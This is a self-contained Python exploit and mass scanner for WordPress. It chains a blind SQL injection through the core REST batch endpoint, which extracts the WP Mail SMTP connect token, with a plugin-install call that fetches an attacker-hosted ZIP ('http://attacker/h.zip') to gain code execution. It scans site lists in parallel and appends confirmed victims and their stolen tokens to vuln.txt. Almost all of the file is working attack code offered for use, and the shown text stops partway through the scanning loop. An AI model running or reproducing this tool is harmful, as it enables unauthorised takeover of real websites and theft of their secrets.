"""WP-core batch-confusion SQLi -> WP Mail SMTP raw-token gate -> RCE  |  GENERAL
scanner, single self-contained file. It embeds the complete verified engine (the exact
code proven byte-exact against the local WordPress 7.0.1 lab) plus its CLI: copy this one
file anywhere - NO Python dependencies beyond the standard library, NO sibling files.

What it does, per target (all self-discovered, nothing assumed):
  * REST batch endpoint sanity across candidate URLs (index.php?rest_route= / ?rest_route= /
    wp-json/batch/v1 ...) with POST-preserving redirects (http->https hosts stay intact)
  * oracle self-check on 1=1/1=2 with a row channel that survives draft-only content and
    author-id-0 imports (status=any, NOT IN (-1)); zero-row installs report why instead
    of hanging
  * SQL dialect auto-detection (sqlite vs mysql/mariadb) and any $table_prefix discovery
    (candidate list, then metadata enumeration) - read the siteurl row to verify
  * blind token extraction with probes PACKED ~12-per-HTTP-request inside one outer batch
    (the core 'at most N items' cap is auto-learned) and independent batch frames in
    parallel (--threads, default 2): a 128-char token is ~100 HTTP requests total
  * raw-token wp_mail_smtp_connect_process fire (plugin 2.6-3.8.x; 3.9.0+ reports
    gate_rejected - HMAC family), structural analysis of any reply (json/html/zero-body/
    statuses -> verdict), and far-side ground truth through the SAME SQLi: the token row
    must be gone and the planted plugin slug active in active_plugins

Scanning (recommended - run it and answer the two prompts, sites-list .txt and payload ZIP):
  python poc_sqli_wpms_general.py
Non-interactive:
  python poc_sqli_wpms_general.py --sites list.txt --url-zip http://attacker/h.zip
  python poc_sqli_wpms_general.py --target https://victim --url-zip http://attacker/h.zip
Every host proven exploitable is appended to vuln.txt ([CONFIRMED] <host>) as soon as it
is proven, one line per hit, flushed immediately. --no-fire extracts only and appends
nothing.

Honest limits: the MySQL payload set is implemented but lab-verified only on SQLite; the
final verdict is the far side (token row gone + plugin active), the server message is
informational only.
"""

"""Shared engine for the WP-core batch-confusion SQLi -> WP Mail SMTP RCE PoC.

Self-discovering, self-verifying, and fast:

  1. Oracle self-check  (batch confusion must answer TRUE/FALSE on 1=1 / 1=2)
  2. Dialect discovery   mysql | sqlite (auto via sqlite_master / DUAL markers)
  3. Options-table discovery (any dynamic table prefix: candidate list, then
     sqlite_master / information_schema enumeration, verified via siteurl)
4. Blind option extraction. Two engine paths:
        - fast path  (default): independent probes are PACKED into one outer REST batch
          frame [primer, {posts(batch), batch} * K] (K auto-bounded by the core's
          "at most N items" per-request cap), so a whole 128-char token costs ~100 HTTP
          round-trips (~2.5-3 min on the dev server);
        - legacy path (fallback): one HTTP request per probe.
      Both re-verify every character with an exact-equality round and re-extract
      outliers on a larger code-point range when a value falls out of range.
  5. Fire wp_mail_smtp_connect_process (raw oth token, WP Mail SMTP 2.6-3.8.x)
     and ANALYZE the server answer structurally (json/html/zero-body/statuses,
     success-flag variants of any shape, keyword sets -> verdict).
  6. Post-fire ground truth is the far side, not the success message: the same
     SQLi re-reads the token row (must be gone: one-shot) and active_plugins
     (must list the planted slug). The server reply is informational.

Confirmed live on WP 7.0.1 (SQLite drop-in) + WP Mail SMTP 3.8.0.
"""

import asyncio
import json
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

try:
    import aiohttp
    HAS_AIOHTTP = True
except Exception:  # pragma: no cover - optional accelerator
    aiohttp = None
    HAS_AIOHTTP = False


class ProbeError(RuntimeError):
    pass


class CampaignAbort(ProbeError):
    pass


def urlq(s):
    return urllib.parse.quote(s, safe="")


def sq(name):
    return "'%s'" % name.replace("\\", "\\\\").replace("'", "''")


class _PreserveRedirect(urllib.request.HTTPRedirectHandler):
    """Follow 301/302/303/307/308 re-issuing the SAME method+body (urllib otherwise
    demotes POST to GET on 301/302/303, silently losing the batch payload)."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        method = req.get_method()
        data = req.data
        if data and method == "POST":
            newheaders = {k: v for k, v in req.headers.items()}
            newheaders["Content-Length"] = str(len(data))
            return urllib.request.Request(newurl, data=data, method=method, headers=newheaders)
        return urllib.request.Request(newurl, headers={k: v for k, v in req.headers.items()})


class Target:
    def __init__(self, base, timeout=60.0, retries=2):
        base = (base or "").strip()
        if base and "://" not in base:
            base = "http://" + base
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.retries = retries
        self.req_no = 0
        self._lock = threading.Lock()
        self.batch = None
        self.ajax = None
        self._opener = urllib.request.build_opener(_PreserveRedirect())

    def batch_path(self):
        if self.batch:
            return self.batch
        return self.base + "/index.php?rest_route=/batch/v1"

    def ajax_path(self):
        if self.ajax:
            return self.ajax
        return self.base + "/wp-admin/admin-ajax.php"

    def _request(self, url, data, headers):
        last = None
        for attempt in range(1 + self.retries):
            req = urllib.request.Request(url, data=data, headers=headers)
            try:
                with self._opener.open(req, timeout=self.timeout) as r:
                    return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
            except urllib.error.HTTPError as e:
                return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
            except Exception as exc:
                last = exc
                time.sleep(0.6 * attempt)
        raise ProbeError("http request failed: %r" % (last,))

    def count_request(self):
        with self._lock:
            self.req_no += 1

    def post(self, url, payload, form=False):
        self.count_request()
        if form:
            data = urllib.parse.urlencode(payload).encode()
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        else:
            data = json.dumps(payload).encode()
            headers = {"Content-Type": "application/json"}
        st, _, body = self._request(url, data, headers)
        return st, body

    def post_raw(self, url, payload, form=False):
        self.count_request()
        if form:
            data = urllib.parse.urlencode(payload).encode()
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        else:
            data = json.dumps(payload).encode()
            headers = {"Content-Type": "application/json"}
        return self._request(url, data, headers)

    def request_count(self):
        with self._lock:
            return self.req_no


class SQLiSink:
    def __init__(self, target, dialect="sqlite", prefix=None, length=None, threads=1,
                 transport="auto"):
        self.t = target
        self.dialect = dialect.lower()
        if self.dialect == "mysql":
            self.sub, self.cp = "SUBSTRING", "ord"
        else:
            self.sub, self.cp = "SUBSTR", "unicode"
        self.prefix = prefix
        self.length_opt = length
        self.multi_batch = 12
        self.status = None
        self._multi = None
        self.threads = max(1, int(threads))
        self.transport = transport
        self._lock = threading.Lock()

    @property
    def use_aio(self):
        return self.transport in ("auto", "aio") and HAS_AIOHTTP

    def ident(self, name):
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", name):
            return name
        if self.dialect == "sqlite":
            return '"' + name.replace('"', '""') + '"'
        return "`" + name.replace("`", "``") + "`"

    def table(self, suffix):
        if self.prefix is None:
            raise CampaignAbort("no database prefix resolved")
        return self.ident(self.prefix + suffix)

    def option_row(self, col, name, order="LIMIT 1"):
        return "(SELECT %s FROM %s WHERE option_name=%s %s)" % (
            col, self.table("options"), sq(name), order)

    @staticmethod
    def _cond(cond):
        return "-1) AND (CASE WHEN (%s) THEN 1 ELSE 0 END) -- -" % cond

    def _inner_requests(self, author_exclude):
        path = "/wp/v2/categories?author_exclude=" + urlq(author_exclude)
        if self.status:
            path += "&status=" + urlq(self.status)
        return {
            "requests": [
                {"path": "http://"},
                {"method": "GET", "path": path},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }

    def _walk_bool(self, responses, index, ctx):
        try:
            rows = responses[index]["body"]["responses"][1]["body"]
            return isinstance(rows, list) and len(rows) > 0
        except (KeyError, IndexError, TypeError):
            raise ProbeError("unexpected batch shape (%s): %s" % (ctx, json.dumps(responses[0:4])[:240]))

    def probe_one(self, author_exclude):
        outer = {"requests": [
            {"path": "http://"},
            {"method": "POST", "path": "/wp/v2/posts", "body": self._inner_requests(author_exclude)},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        st, text = self.t.post(self.t.batch_path(), outer)
        try:
            j = json.loads(text)
            return self._walk_bool(j["responses"], 1, "single")
        except (KeyError, IndexError, TypeError, ValueError):
            raise ProbeError("unexpected batch response (patched core? wrong --target?): HTTP %s %s"
                             % (st, text[:160]))

    class _SizeNeeded(Exception):
        def __init__(self, nb):
            super().__init__("batch limit learned: %d" % nb)
            self.nb = nb

    def _build_frame(self, part):
        blocks = [{"path": "http://"}]
        for p in part:
            blocks.append({"method": "POST", "path": "/wp/v2/posts",
                           "body": self._inner_requests(p)})
            blocks.append({"method": "POST", "path": "/batch/v1", "body": {"requests": []}})
        return {"requests": blocks}

    def _parse_frame(self, st, text, size):
        """Shared response parser (identical for the aiohttp and urllib transports).

        Raises _SizeNeeded when the core reports a stricter per-request item cap,
        ProbeError for any other malformed shape."""
        try:
            j = json.loads(text)
            return [self._walk_bool(j["responses"], 1 + 2 * k, "multi") for k in range(size)]
        except (KeyError, IndexError, TypeError, ValueError):
            m = re.search(r"at most (\d+) items", text)
            if m:
                nb = max(1, (int(m.group(1)) - 1) // 2)
                if nb < size:
                    raise self._SizeNeeded(nb)
            raise ProbeError("packed batch parse failed (HTTP %s, %d probes): %s"
                             % (st, size, text[:200]))

    def _eval_frame(self, part, size):
        """POST one packed frame of `part` (len == size) over urllib, returning its booleans."""
        st, text = self.t.post(self.t.batch_path(), self._build_frame(part))
        return self._parse_frame(st, text, size)

    def probe_many(self, payloads):
        if not payloads:
            return []
        chunks = [payloads[i:i + self.multi_batch] for i in range(0, len(payloads), self.multi_batch)]

        def run(chunk):
            out = []
            rest = chunk
            while rest:
                size = min(len(rest), self.multi_batch)
                part = rest[:size]
                try:
                    got = self._eval_frame(part, size)
                except self._SizeNeeded as nb:
                    with self._lock:
                        if nb.nb < self.multi_batch:
                            self.multi_batch = nb.nb
                    continue
                out.extend(got)
                rest = rest[size:]
            return out

        if self.use_aio:
            try:
                return asyncio.run(self._probe_many_aio(chunks))
            except Exception:
                pass
        n = len(chunks)
        if self.threads > 1 and n > 1:
            with ThreadPoolExecutor(max_workers=min(self.threads, n)) as ex:
                results = list(ex.map(run, chunks))
        else:
            results = [run(c) for c in chunks]
        return [v for r in results for v in r]

    async def _aio_post_preserve(self, session, url, frame):
        """POST with redirects that preserve the method+body (aiohttp's default follows
        browser semantics and would demote POST to GET on 301/302/303)."""
        last = None
        for attempt in range(1 + self.t.retries):
            target = url
            try:
                for _hops in range(6):
                    async with session.post(target, json=frame, allow_redirects=False) as resp:
                        if resp.status in (301, 302, 303, 307, 308) and resp.headers.get("Location"):
                            target = urllib.parse.urljoin(target, resp.headers["Location"])
                            continue
                        self.t.count_request()
                        return resp.status, await resp.text()
                raise ProbeError("too many redirects")
            except asyncio.TimeoutError as exc:
                last = exc
                await asyncio.sleep(0.5 * attempt)
            except aiohttp.ClientError as exc:
                last = exc
                await asyncio.sleep(0.5 * attempt)
        raise ProbeError("http request failed: %r" % (last,))

    async def _probe_many_aio(self, chunks):
        sem = asyncio.Semaphore(self.threads)
        timeout = aiohttp.ClientTimeout(total=self.t.timeout)
        connector = aiohttp.TCPConnector(limit=self.threads * 4, enable_cleanup_closed=True)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            async def run_chunk(chunk):
                out = []
                rest = chunk
                while rest:
                    size = min(len(rest), self.multi_batch)
                    part = rest[:size]
                    async with sem:
                        st, text = await self._aio_post_preserve(
                            session, self.t.batch_path(), self._build_frame(part))
                    try:
                        got = self._parse_frame(st, text, size)
                    except self._SizeNeeded as nb:
                        with self._lock:
                            if nb.nb < self.multi_batch:
                                self.multi_batch = nb.nb
                        continue
                    out.extend(got)
                    rest = rest[size:]
                return out
            results = await asyncio.gather(*[run_chunk(c) for c in chunks])
        return [v for r in results for v in r]

    def multi_ok(self):
        if self._multi is None:
            try:
                want = [self._cond(c) for c in ("1=1", "1=2", "1=1")]
                self._multi = self.probe_many(want) == [True, False, True]
            except ProbeError:
                self._multi = False
        return self._multi

    def expr_probe(self, cond):
        return self.probe_one(self._cond(cond))

    def expr_probe_many(self, conds):
        return self.probe_many([self._cond(c) for c in conds])

    def char_ge(self, sub, pos, val):
        return "-1) AND (CASE WHEN (SELECT %s(%s(%s,%d,1)))>=%d THEN 1 ELSE 0 END) -- -" % (
            self.cp, self.sub, sub, pos, val)

    def char_eq(self, sub, pos, ch):
        return "-1) AND (CASE WHEN (SELECT %s(%s(%s,%d,1)))=%d THEN 1 ELSE 0 END) -- -" % (
            self.cp, self.sub, sub, pos, ord(ch))

    def _bisect(self, cond_of_mid, lo, hi):
        lo, hi = int(lo), int(hi)
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.expr_probe(cond_of_mid(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar_length(self, sub, lo=0, hi=4096):
        return self._bisect(lambda m: "(SELECT length(%s))>=%d" % (sub, m), lo, hi)

    def extract_chars_batch(self, sub, length, lo=32, hi=126, progress=None):
        curs = {p: (lo, hi) for p in range(1, length + 1)}
        while True:
            pending = {p: q for p, q in curs.items() if q[0] < q[1]}
            if not pending:
                break
            mids = [(p, (l + h + 1) // 2) for p, (l, h) in pending.items()]
            vals = self.probe_many([self.char_ge(sub, p, m) for p, m in mids])
            for (p, m), ok in zip(mids, vals):
                l, h = pending[p]
                curs[p] = (m, h) if ok else (l, m - 1)
            if progress:
                progress(length - len({p for p, q in curs.items() if q[0] < q[1]}))
        chars = {p: chr(q[0]) for p, q in curs.items()}
        ok = self.probe_many([self.char_eq(sub, p, chars[p]) for p in range(1, length + 1)])
        good = [p for p, o in zip(range(1, length + 1), ok) if o]
        bad = [p for p in range(1, length + 1) if p not in good]
        if bad:
            redo = {p: 255 if self.dialect == "mysql" else 0x10FFFF for p in bad}
            rounds = 0
            while bad and rounds < 3:
                rounds += 1
                self._refine_range(sub, curs, bad, redo)
                ok2 = self.probe_many([self.char_eq(sub, p, chars[p]) for p in bad])
                good = [p for p, o in zip(bad, ok2) if o]
                bad = [p for p in bad if p not in good]
                for p in bad:
                    redo[p] = 0x10FFFF
            if bad:
                raise ProbeError("characters %s out of the SQLi code-point range and unverifiable"
                                 % bad)
        return "".join(chars[p] for p in range(1, length + 1))

    def _refine_range(self, sub, curs, positions, hi_map):
        pending = {p: (curs[p][0], hi_map[p]) for p in positions}
        while True:
            act = {p: q for p, q in pending.items() if q[0] < q[1]}
            if not act:
                break
            mids = [(p, (l + h + 1) // 2) for p, (l, h) in act.items()]
            vals = self.probe_many([self.char_ge(sub, p, m) for p, m in mids])
            for (p, m), ok in zip(mids, vals):
                l, h = act[p]
                pending[p] = (m, h) if ok else (l, m - 1)
        for p in positions:
            curs[p] = (pending[p][0], pending[p][0])

    def scalar(self, sub, length=None, threads=1, progress=None, narrow_hex=True):
        if threads and int(threads) > self.threads:
            self.threads = int(threads)
        if not length and self.length_opt:
            length = self.length_opt
        if not length:
            length = self.scalar_length(sub)
        if length <= 0:
            return ""
        if self.multi_ok():
            got = self.extract_chars_batch(sub, length, progress=progress)
            if progress:
                progress(length)
            return got
        out = []
        for pos in range(1, length + 1):
            c = self._char_legacy(sub, pos)
            out.append(c)
            if progress:
                progress(len(out))
        return "".join(out)

    def _char_legacy(self, sub, pos):
        v = self._bisect(lambda m: self.char_ge(sub, pos, m), 32, 126)
        if not self.expr_probe(self.char_eq(sub, pos, chr(v))):
            v = self._bisect(lambda m: self.char_ge(sub, pos, m), 32, 0x10FFFF)
        return chr(v)


class Discovery:
    def __init__(self, sink):
        self.s = sink

    def endpoints(self):
        t = self.s.t
        if t.batch is None:
            cand = [
                t.base + "/index.php?rest_route=/batch/v1",
                t.base + "/?rest_route=/batch/v1",
                t.base + "/wp-json/batch/v1",
                t.base + "/index.php/rest_route=/batch/v1",
            ]
            ok = None
            for url in cand:
                try:
                    st, body = t.post(url, {"requests": []})
                except ProbeError:
                    continue
                try:
                    j = json.loads(body.lstrip("\ufeff \t\r\n"))
                except ValueError:
                    continue
                if isinstance(j, dict) and ("responses" in j or "failed" in j or "code" in j):
                    ok = url
                    break
            if ok is None:
                raise CampaignAbort(
                    "REST batch endpoint not reachable as JSON (tested %d candidate URLs). "
                    "Is the target WordPress 5.6+ with the REST API enabled, or is a "
                    "proxy/WAF/security plugin blocking /batch/v1 or index.php?rest_route=?"
                    % len(cand))
            t.batch = ok
        if t.ajax is None:
            t.ajax = t.base + "/wp-admin/admin-ajax.php"
        return t.batch

    def rest_is_json(self):
        try:
            self.endpoints()
            return True
        except CampaignAbort:
            return False

    def controls(self):
        ok = self.s.expr_probe_many(["1=1", "1=2"])
        ok_t, ok_f = ok[0], ok[1]
        if ok_t and not ok_f:
            return True
        if ok_t and ok_f:
            raise CampaignAbort(
                "oracle responds TRUE to both 1=1 and 1=2 (rows are returned either way): "
                "the injected author_exclude WHERE is not reaching the query (payload sanitized "
                "to an id-list, custom core, or a security filter) OR the batch confusion no "
                "longer maps the payload onto the posts handler.")
        has = self.content_ok()
        if not has:
            raise CampaignAbort(
                "no usable row channel: the queried type has zero rows of any reachable status "
                "(the default installation always ships at least 'Hello world!' + 'Sample Page'; "
                "an 'empty WordPress' with no content rows at all can therefore not be probed). "
                "1=1 -> %s, 1=2 -> %s." % (ok_t, ok_f))
        raise CampaignAbort(
            "batch-confusion oracle failed although content rows exist (1=1 -> %s, 1=2 -> %s). "
            "Possible causes: core patched; batch/embed routes disabled by a plugin; "
            "the target is not a 5.6+ WordPress REST API; or a WAF rewrote the payload."
            % (ok_t, ok_f))

    def dialect(self):
        for d, probes in {
            "sqlite": ["(SELECT count(*) FROM sqlite_master)>0", "(SELECT unicode('A'))=65"],
            "mysql": ["(SELECT count(*) FROM DUAL)>=0", "(SELECT ORD('A'))=65"],
        }.items():
            for p in probes:
                try:
                    if self.s.expr_probe(p):
                        return d
                except ProbeError:
                    raise
        raise CampaignAbort("could not identify the SQL dialect")

    def _candidate_prefixes(self):
        return ["", "wp_", "wp", "_", "wp2_", "wp2", "site_", "blog_", "cms_", "sqlite_", "xa_", "ps_"]

    def _verify_table(self, table_name):
        for probe in [
            "(SELECT count(*) FROM %s)>0" % table_name,
            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (table_name, sq("siteurl")),
        ]:
            if not self.s.expr_probe(probe):
                return False
        return True

    def content_ok(self):
        return bool(self.s.expr_probe("(SELECT count(*) FROM %s)>0" % self.s.table("posts")))

    def table_prefix(self):
        for p in self._candidate_prefixes():
            ident = self.s.ident(p + "options")
            try:
                if self.s.expr_probe("(SELECT count(*) FROM %s)>0" % ident):
                    if self._verify_table(ident):
                        return p
            except ProbeError:
                raise
        return self._prefix_from_metadata()

    def _prefix_from_metadata(self):
        if self.s.dialect == "sqlite":
            exists = ("(SELECT count(*) FROM sqlite_master WHERE type='table' "
                      "AND name LIKE '%%options')>0")
            name_sub = ("(SELECT name FROM sqlite_master WHERE type='table' "
                        "AND name LIKE '%%options' ORDER BY name LIMIT 1 OFFSET %d)")
        else:
            exists = ("(SELECT count(*) FROM information_schema.tables WHERE table_schema=database() "
                      "AND table_name LIKE '%%options')>0")
            name_sub = ("(SELECT table_name FROM information_schema.tables WHERE table_schema=database() "
                        "AND table_name LIKE '%%options' ORDER BY table_name LIMIT 1 OFFSET %d)")
        try:
            present = self.s.expr_probe(exists)
        except ProbeError:
            raise
        if not present:
            raise CampaignAbort("could not locate any WordPress 'options' table")
        for off in range(5):
            sub = name_sub % off
            try:
                nlen = self.s.scalar_length(sub)
                if nlen <= 0 or nlen > 160:
                    continue
                nm = self.s.scalar(sub, length=nlen)
            except ProbeError:
                raise
            if nm.endswith("options"):
                ident = self.s.ident(nm)
                try:
                    if self._verify_table(ident):
                        return nm[: -len("options")]
                except ProbeError:
                    raise
        raise CampaignAbort("options table found in metadata but none reads the 'siteurl' option")


class Campaign:
    OPT_TOKEN = "wp_mail_smtp_connect_token"
    OPT_LIC = "wp_mail_smtp_connect"

    def __init__(self, sink, threads=1, progress=None):
        self.s = sink
        self.threads = threads
        self.progress = progress

    def options_state(self):
        t = self.s
        conds = [
            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_TOKEN)),
            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_LIC)),
            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq("active_plugins")),
        ]
        tok, lic, has_ap = self.s.expr_probe_many(conds)
        lite = None
        if has_ap:
            lite = t.expr_probe("(SELECT instr(%s,%s))>0"
                                % (t.option_row("option_value", "active_plugins", order=""),
                                   sq("wp-mail-smtp")))
        return {"connect_token": bool(tok), "connect_license": bool(lic),
                "active_plugins": bool(has_ap), "lite_plugin": bool(lite)}

    def sub_token(self):
        return self.s.option_row("option_value", self.OPT_TOKEN)

    def extract(self, length=None):
        return self.s.scalar(self.sub_token(), length=length, threads=self.threads,
                             progress=self.progress)

    def verify_samples(self, token, sub):
        n = len(token)
        picks = sorted({1, (n + 1) // 2, n})
        conds = [self.s.char_eq(sub, p, token[p - 1]) for p in picks]
        vals = self.s.probe_many(conds)
        return all(vals)

    def fire(self, token, url_zip):
        body = {"action": "wp_mail_smtp_connect_process", "oth": token, "file": url_zip}
        return self.s.t.post_raw(self.s.t.ajax_path(), body, form=True)

    @staticmethod
    def analyze_fire(st, headers, raw):
        """Structurally analyze any admin-ajax reply, not raw-string dependent."""
        sig = {"http": st, "content_type": (headers.get("Content-Type") or "").lower(),
               "raison": "unknown", "parsed": None, "message": "", "verdict": "unknown"}
        body = (raw or "").strip()
        if st == 400 and (body == "0" or body == ""):
            sig["raison"] = "zero-body"; sig["verdict"] = "no_hook"; return sig
        if st in (403, 429):
            sig["raison"] = "blocked-status"; sig["verdict"] = "blocked"; return sig
        j = None
        start = body.find("{")
        if start >= 0:
            try:
                j = json.loads(body[start:])
            except ValueError:
                j = None
        if j is None:
            if body.lower().startswith(("<html", "<!doctype html")):
                sig["raison"] = "html"; sig["verdict"] = "blocked"; return sig
            if body:
                sig["raison"] = "non-json"; sig["verdict"] = "unknown"; sig["message"] = body[:200]
                return sig
            sig["raison"] = "empty"; sig["verdict"] = "no_hook"; return sig
        sig["parsed"] = j
        success = j.get("success")
        msg = j.get("data") if isinstance(j.get("data"), str) else None
        if msg is None and isinstance(j.get("message"), str):
            msg = j["message"]
        sig["message"] = msg or ""
        low = (msg or "").lower()
        if any(w in low for w in ("installed", "activated", "upgraded", "pro version", "plugin", "success")):
            sig["verdict"] = "installed"
        elif any(w in low for w in ("secret", "nonce", "permission", "forbidden", "token", "invalid")):
            sig["verdict"] = "gate_rejected"
        elif any(w in low for w in ("license", "license key", "expired")):
            sig["verdict"] = "license_rejected"
        elif success is True:
            sig["verdict"] = "installed"
        elif success is False:
            sig["verdict"] = "rejected"
        else:
            sig["verdict"] = "unknown"
        return sig

    def postchecks(self, plugin_slug):
        t = self.s
        conds = [
            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_TOKEN)),
            "(SELECT instr(%s,%s))>0" % (t.option_row("option_value", "active_plugins", order=""),
                                         sq(plugin_slug)),
            "(SELECT instr(%s,%s))>0" % (t.option_row("option_value", "active_plugins", order=""),
                                         sq("wp-mail-smtp")),
        ]
        tok, evil, lite = t.expr_probe_many(conds)
        return {"token_row_gone": not bool(tok), "evil_plugin_active": bool(evil),
                "lite_plugin": bool(lite)}


def aio_available():
    """True when the aiohttp accelerator is importable on this interpreter."""
    return bool(HAS_AIOHTTP)


def scan_target(target, url_zip=None, do_fire=True, dialect="auto", prefix=None,
                length=None, timeout=60.0, retries=2, threads=1,
                plugin_slug="evilprobe", transport="auto",
                echo=None, progress_start=None, progress=None, progress_end=None):
    """Run the full verified chain once against one WordPress root.

    Never raises for host-level issues: returns a dict describing the outcome.
      host, ok, verdict, error, token, requests, seconds,
      fire_status, fire_message, fire_verdict, token_row_gone, evil_plugin_active
    ok == CHAIN CONFIRMED (fire installed AND far-side token row gone AND the
    planted slug listed in active_plugins). The server message is informational.

    transport: 'auto' -> aiohttp when importable, else the urllib+threads path;
    'threads' -> always urllib+threads; 'sync' -> strictly sequential urllib.

    progress_start(total) is called just before the character extraction begins
    (the value length is already known then), progress(done) is called every
    batch round so a UI bar stays live, progress_end() runs when it finishes.
    """
    summary = {"host": target, "ok": False, "verdict": "unknown", "error": None,
               "token": None, "requests": 0, "seconds": 0.0,
               "fire_status": None, "fire_message": "", "fire_verdict": None,
               "token_row_gone": None, "evil_plugin_active": None}
    tgt = None
    t0 = time.time()

    def say(msg):
        if echo:
            echo(msg)

    try:
        tgt = Target(target, timeout=timeout, retries=retries)
        sink = SQLiSink(tgt, dialect=("sqlite" if dialect == "auto" else dialect),
                        prefix=prefix, length=length, threads=threads, transport=transport)
        sink.status = "any"
        disc = Discovery(sink)

        disc.endpoints()
        say("REST batch endpoint: %s" % tgt.batch_path())

        if dialect == "auto":
            got = disc.dialect()
            sink.dialect = got
            sink.sub, sink.cp = ("SUBSTR", "unicode") if got == "sqlite" else ("SUBSTRING", "ord")
            say("dialect auto-detected: %s" % got)
        else:
            say("dialect forced: %s" % sink.dialect)

        if not prefix:
            sink.prefix = disc.table_prefix()
            say("table prefix discovered: %r (options = %soptions)" % (sink.prefix, sink.prefix))
        else:
            say("table prefix forced: %r" % sink.prefix)

        disc.controls()
        say("oracle controls passed (1=1 -> rows, 1=2 -> empty)")

        cam = Campaign(sink, threads=threads, progress=progress)
        st0 = cam.options_state()
        say("options state: token=%s license=%s active_plugins=%s lite_plugin=%s" % (
            st0["connect_token"], st0["connect_license"], st0["active_plugins"], st0["lite_plugin"]))
        if not st0["connect_token"]:
            raise CampaignAbort(
                "connect token row absent: the WP Mail SMTP connect wizard has not run to that "
                "state here (or this host reads with a wrong dialect/prefix).")
        if not st0["lite_plugin"]:
            say("warning: active_plugins does not list wp-mail-smtp")

        total = length or sink.length_opt or sink.scalar_length(cam.sub_token())
        if progress_start:
            progress_start(total)
        token = cam.extract(length=total)
        if progress_end:
            progress_end()
        summary["token"] = token
        say("extracted connect token: %s" % token)

        if not do_fire:
            summary["verdict"] = "extracted (%d chars)" % len(token)
            return summary
        if not url_zip:
            raise CampaignAbort("fire requested but no --url-zip payload URL was provided")

        st, headers, raw = cam.fire(token, url_zip)
        sig = cam.analyze_fire(st, headers, raw)
        summary["fire_status"] = st
        summary["fire_message"] = sig["message"]
        summary["fire_verdict"] = sig["verdict"]
        say("connect_process -> HTTP %s : %r [%s]" % (st, raw[:200], sig["verdict"]))

        post = cam.postchecks(plugin_slug)
        summary["token_row_gone"] = post["token_row_gone"]
        summary["evil_plugin_active"] = post["evil_plugin_active"]
        say("post-fire far-side: token_row_gone=%s evil_plugin_active=%s" % (
            post["token_row_gone"], post["evil_plugin_active"]))

        ok = (sig["verdict"] == "installed") and post["token_row_gone"] and post["evil_plugin_active"]
        summary["ok"] = ok
        summary["verdict"] = "CHAIN CONFIRMED" if ok else "partial/inconclusive (see above)"
        return summary
    except (CampaignAbort, ProbeError) as exc:
        summary["error"] = str(exc)
        summary["verdict"] = "error"
        return summary
    except Exception as exc:
        summary["error"] = "%s: %s" % (type(exc).__name__, exc)
        summary["verdict"] = "error"
        return summary
    finally:
        summary["seconds"] = round(time.time() - t0, 1)
        if tgt is not None:
            summary["requests"] = tgt.request_count()


def load_targets(path):
    """Read a list of WordPress roots, one per line (blank lines and # comments skipped)."""
    hosts = []
    with open(path, encoding="utf-8-sig") as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            host = ln.split()[0]
            if "://" not in host:
                host = "http://" + host
            hosts.append(host)
    if not hosts:
        raise CampaignAbort("sites list %r has no usable target lines" % path)
    return hosts


_VULN_LOCK = threading.Lock()


def append_vuln(path, host, seconds=0.0, token=None):
    """Append one CONFIRMED victim promptly (flush on every append). Safe to call from the
    parallel host workers (appends are serialized)."""
    with _VULN_LOCK:
        with open(path, "a", encoding="utf-8") as f:
            f.write("[CONFIRMED] %s  (%.0fs)%s\n" % (
                host, seconds, ("  token=%s" % token) if token else ""))
            f.flush()


def scan_targets(ui, targets, do_fire=True, url_zip=None, dialect="auto", prefix=None,
                 length=None, timeout=60.0, retries=2, threads=2, workers=2,
                 plugin_slug="evilprobe", vuln_out="vuln.txt", transport="auto", on_host=None):
    """Scan a list of hosts through the shared single-host chain, scanning `workers` hosts
    concurrently (each host keeps its own per-batch `threads` parallelism). Every proven victim
    is appended to vuln_out on the spot (lock-serialized). on_host(host, r) fires after each
    host's result (used by the local build for lab-only byte-compares/marker checks).

    Returns an exit code: 0 = run completed (--no-fire, or >=1 CONFIRMED), 1 = zero confirmed.
    The wall-clock for N hosts is ~one host's runtime with enough workers, and long lists keep
    their throughput instead of degrading linearly."""
    ui.info("targets: %d site(s); fire=%s; hosts-in-parallel=%d; threads-per-host=%d" % (
        len(targets), "OFF (--no-fire)" if not do_fire else "ON",
        max(1, min(len(targets), workers)), threads))
    if not do_fire:
        ui.info("--no-fire: extraction only; nothing is appended")

    pool = max(1, min(len(targets), workers))
    lock = threading.Lock()
    rows = []

    def work(it):
        i, host = it
        try:
            ui.host_header(i, len(targets), host)
            bar = ui.bar("extracting token: %s" % host)
            r = scan_target(host, url_zip=url_zip, do_fire=do_fire, dialect=dialect,
                            prefix=prefix, length=length, timeout=timeout, retries=retries,
                            threads=threads, plugin_slug=plugin_slug, transport=transport,
                            echo=ui.step, progress_start=bar.start, progress=bar.update,
                            progress_end=bar.stop)
            if on_host:
                try:
                    on_host(host, r)
                except Exception as exc:
                    ui.warn("on_host hook error for %s: %s" % (host, exc))
            if r["token"]:
                ui.token(r["token"], r["requests"], r["seconds"])
            if r["ok"]:
                append_vuln(vuln_out, host, seconds=r["seconds"], token=r["token"])
                ui.confirmed(host, r["seconds"], vuln_out)
                res = "CONFIRMED"
            elif r["error"]:
                ui.failed(host, r["error"])
                res = "error"
            else:
                ui.inconclusive(host, r["verdict"])
                res = r["verdict"]
            with lock:
                rows.append((i, host, res, r["requests"], r["seconds"]))
        except Exception as exc:
            ui.failed(host, "%s: %s" % (type(exc).__name__, exc))
